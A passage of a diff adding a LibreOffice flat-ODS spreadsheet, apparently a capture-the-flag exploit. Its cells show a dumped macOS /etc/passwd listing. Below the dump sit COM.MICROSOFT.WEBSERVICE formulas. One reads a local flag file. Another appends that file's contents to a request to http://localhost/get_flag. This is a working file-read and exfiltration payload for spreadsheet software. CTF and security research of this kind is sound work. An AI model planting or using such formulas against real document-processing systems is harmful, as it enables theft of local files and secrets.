Services:/var/spool/cups:/usr/bin/false</text:p><text:p>_postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false</text:p><text:p>_scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false</text:p><text:p>_ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false</text:p><text:p>_appstore:*:33:33:Mac App Store Service:/var/empty:/usr/bin/false</text:p><text:p>_mcxalr:*:54:54:MCX AppLaunch:/var/empty:/usr/bin/false</text:p><text:p>_appleevents:*:55:55:AppleEvents Daemon:/var/empty:/usr/bin/false</text:p><text:p>_geod:*:56:56:Geo Services Daemon:/var/db/geod:/usr/bin/false</text:p><text:p>_devdocs:*:59:59:Developer Documentation:/var/empty:/usr/bin/false</text:p><text:p>_sandbox:*:60:60:Seatbelt:/var/empty:/usr/bin/false</text:p><text:p>_mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false</text:p><text:p>_ard:*:67:67:Apple Remote Desktop:/var/empty:/usr/bin/false</text:p><text:p>_www:*:70:70:World Wide Web Server:/Library/WebServer:/usr/bin/false</text:p><text:p>_eppc:*:71:71:Apple Events User:/var/empty:/usr/bin/false</text:p><text:p>_cvs:*:72:72:CVS Server:/var/empty:/usr/bin/false</text:p><text:p>_svn:*:73:73:SVN Server:/var/empty:/usr/bin/false</text:p><text:p>_mysql:*:74:74:MySQL Server:/var/empty:/usr/bin/false</text:p><text:p>_sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false</text:p><text:p>_qtss:*:76:76:QuickTime Streaming Server:/var/empty:/usr/bin/false</text:p><text:p>_cyrus:*:77:6:Cyrus Administrator:/var/imap:/usr/bin/false</text:p><text:p>_mailman:*:78:78:Mailman List Server:/var/empty:/usr/bin/false</text:p><text:p>_appserver:*:79:79:Application Server:/var/empty:/usr/bin/false</text:p><text:p>_clamav:*:82:82:ClamAV Daemon:/var/virusmails:/usr/bin/false</text:p><text:p>_amavisd:*:83:83:AMaViS Daemon:/var/virusmails:/usr/bin/false</text:p><text:p>_jabber:*:84:84:Jabber XMPP Server:/var/empty:/usr/bin/false</text:p><text:p>_appowner:*:87:87:Application Owner:/var/empty:/usr/bin/false</text:p><text:p>_windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false</text:p><text:p>_spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false</text:p><text:p>_tokend:*:91:91:Token Daemon:/var/empty:/usr/bin/false</text:p><text:p>_securityagent:*:92:92:SecurityAgent:/var/db/securityagent:/usr/bin/false</text:p><text:p>_calendar:*:93:93:Calendar:/var/empty:/usr/bin/false</text:p><text:p>_teamsserver:*:94:94:TeamsServer:/var/teamsserver:/usr/bin/false</text:p><text:p>_update_sharing:*:95:-2:Update Sharing:/var/empty:/usr/bin/false</text:p><text:p>_installer:*:96:-2:Installer:/var/empty:/usr/bin/false</text:p><text:p>_atsserver:*:97:97:ATS Server:/var/empty:/usr/bin/false</text:p><text:p>_ftp:*:98:-2:FTP Daemon:/var/empty:/usr/bin/false</text:p><text:p>_unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false</text:p><text:p>_softwareupdate:*:200:200:Software Update Service:/var/db/softwareupdate:/usr/bin/false</text:p><text:p>_coreaudiod:*:202:202:Core Audio Daemon:/var/empty:/usr/bin/false</text:p><text:p>_screensaver:*:203:203:Screensaver:/var/empty:/usr/bin/false</text:p><text:p>_locationd:*:205:205:Location Daemon:/var/db/locationd:/usr/bin/false</text:p><text:p>_trustevaluationagent:*:208:208:Trust Evaluation Agent:/var/empty:/usr/bin/false</text:p><text:p>_timezone:*:210:210:AutoTimeZoneDaemon:/var/empty:/usr/bin/false</text:p><text:p>_lda:*:211:211:Local Delivery Agent:/var/empty:/usr/bin/false</text:p><text:p>_cvmsroot:*:212:212:CVMS Root:/var/empty:/usr/bin/false</text:p><text:p>_usbmuxd:*:213:213:iPhone OS Device Helper:/var/db/lockdown:/usr/bin/false</text:p><text:p>_dovecot:*:214:6:Dovecot Administrator:/var/empty:/usr/bin/false</text:p><text:p>_dpaudio:*:215:215:DP Audio:/var/empty:/usr/bin/false</text:p><text:p>_postgres:*:216:216:PostgreSQL Server:/var/empty:/usr/bin/false</text:p><text:p>_krbtgt:*:217:-2:Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false</text:p><text:p>_kadmin_admin:*:218:-2:Kerberos Admin Service:/var/empty:/usr/bin/false</text:p><text:p>_kadmin_changepw:*:219:-2:Kerberos Change Password Service:/var/empty:/usr/bin/false</text:p><text:p>_devicemgr:*:220:220:Device Management Server:/var/empty:/usr/bin/false</text:p><text:p>_webauthserver:*:221:221:Web Auth Server:/var/empty:/usr/bin/false</text:p><text:p>_netbios:*:222:222:NetBIOS:/var/empty:/usr/bin/false</text:p><text:p>_warmd:*:224:224:Warm Daemon:/var/empty:/usr/bin/false</text:p><text:p>_dovenull:*:227:227:Dovecot Authentication:/var/empty:/usr/bin/false</text:p><text:p>_netstatistics:*:228:228:Network Statistics Daemon:/var/empty:/usr/bin/false</text:p><text:p>_avbdeviced:*:229:-2:Ethernet AVB Device Daemon:/var/empty:/usr/bin/false</text:p><text:p>_krb_krbtgt:*:230:-2:Open Directory Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false</text:p><text:p>_krb_kadmin:*:231:-2:Open Directory Kerberos Admin Service:/var/empty:/usr/bin/false</text:p><text:p>_krb_changepw:*:232:-2:Open Directory Kerberos Change Password Service:/var/empty:/usr/bin/false</text:p><text:p>_krb_kerberos:*:233:-2:Open Directory Kerberos:/var/empty:/usr/bin/false</text:p><text:p>_krb_anonymous:*:234:-2:Open Directory Kerberos Anonymous:/var/empty:/usr/bin/false</text:p><text:p>_assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false</text:p><text:p>_coremediaiod:*:236:236:Core Media IO Daemon:/var/empty:/usr/bin/false</text:p><text:p>_launchservicesd:*:239:239:_launchservicesd:/var/empty:/usr/bin/false</text:p><text:p>_iconservices:*:240:240:IconServices:/var/empty:/usr/bin/false</text:p><text:p>_distnote:*:241:241:DistNote:/var/empty:/usr/bin/false</text:p><text:p>_nsurlsessiond:*:242:242:NSURLSession Daemon:/var/db/nsurlsessiond:/usr/bin/false</text:p><text:p>_nsurlstoraged:*:243:243:NSURLStorage Daemon:/var/db/nsurlstoraged:/usr/bin/false</text:p><text:p>_displaypolicyd:*:244:244:Display Policy Daemon:/var/empty:/usr/bin/false</text:p><text:p>_astris:*:245:245:Astris Services:/var/db/astris:/usr/bin/false</text:p><text:p>_krbfast:*:246:-2:Kerberos FAST Account:/var/empty:/usr/bin/false</text:p><text:p>_gamecontrollerd:*:247:247:Game Controller Daemon:/var/empty:/usr/bin/false</text:p><text:p>_mbsetupuser:*:248:248:Setup User:/var/setup:/bin/bash</text:p><text:p>_ondemand:*:249:249:On Demand Resource Daemon:/var/db/ondemand:/usr/bin/false</text:p><text:p>_xserverdocs:*:251:251:macOS Server Documents Service:/var/empty:/usr/bin/false</text:p><text:p>_wwwproxy:*:252:252:WWW Proxy:/var/empty:/usr/bin/false</text:p><text:p>_mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false</text:p><text:p>_findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false</text:p><text:p>_datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false</text:p><text:p>_captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false</text:p><text:p>_ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false</text:p><text:p>_applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false</text:p><text:p>_hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false</text:p><text:p>_cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false</text:p><text:p>_analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false</text:p><text:p>_fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false</text:p><text:p>_timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false</text:p><text:p>_reportmemoryexception:*:269:269:ReportMemoryException:/var/db/reportmemoryexception:/usr/bin/false</text:p><text:p/>
+     </table:table-cell>
+     <table:table-cell table:number-columns-repeated="8"/>
+    </table:table-row>
+    <table:table-row table:style-name="ro2">
+     <table:table-cell table:formula="of:=COM.MICROSOFT.WEBSERVICE(&quot;/home/libreoffice_admin/flag&quot;)" office:value-type="string" office:string-value="" calcext:value-type="error">
+      <text:p>#VALUE!</text:p>
+     </table:table-cell>
+     <table:table-cell table:number-columns-repeated="8"/>
+    </table:table-row>
+    <table:table-row table:style-name="ro3">
+     <table:table-cell table:formula="of:=COM.MICROSOFT.WEBSERVICE(&quot;http://localhost/get_flag?key=&quot; &amp; COM.MICROSOFT.WEBSERVICE(&quot;/home/libreoffice_admin/flag&quot;))" office:value-type="string" office:string-value="" calcext:value-type="error">
+      <text:p>#VALUE!</text:p>
+     </table:table-cell>
+     <table:table-cell table:number-columns-repeated="8"/>
+    </table:table-row>
+   </table:table>
+   <table:named-expressions/>
+  </office:spreadsheet>
+ </office:body>
+</office:document>
